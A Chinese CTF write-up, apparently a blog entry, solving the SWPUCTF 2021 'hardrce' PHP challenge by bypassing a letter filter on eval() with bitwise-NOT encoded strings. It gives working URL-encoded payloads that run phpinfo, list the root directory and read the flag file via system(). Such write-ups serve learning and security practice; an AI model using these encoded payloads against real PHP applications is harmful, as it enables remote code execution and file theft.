---
date: 2024-05-25
categories: 
    - SWPUCTF
tags:
    - CTF
    - RCE
    - PHP
    - 无字母RCE
---

# 每日一题 —— [SWPUCTF 2021 新生赛]hardrce

> 题目地址：<https://www.nssctf.cn/problem/439>

<!-- more -->

观察到本题有函数 `eval()` 并通过 `wllm` 传参，并过滤了所有的字母以及一部分符号，可知这道题是无字母 RCE。通过查询 RCE bypass, 可以知道对于这种情况，有自增、异或、取反三种不同的绕过方式，所用的符号分别为：`+` `^` `~`。前两个被过滤了，但是取反符号没有被过滤。

我们直接利用 PHP 来生成一个取反的 payload：

```php
<?php
echo urlencode(~'phpinfo');
```

得到：`%8F%97%8F%96%91%99%90`; 

而对于 `eval()` 函数而言，似乎不允许自反时把函数括号给处理，因此 payload格式为： `(~%8F%97%8F%96%91%99%90)();`。 

现在开始构造 payload : `system('ls /')`
构造为：`(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);`

找到根目录下 `/flllllaaaaaaggggggg` 文件，打开它 `system('cat /fl*')`
构造为：`(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%D5);`

赋值给 `wllm`，得到 flag.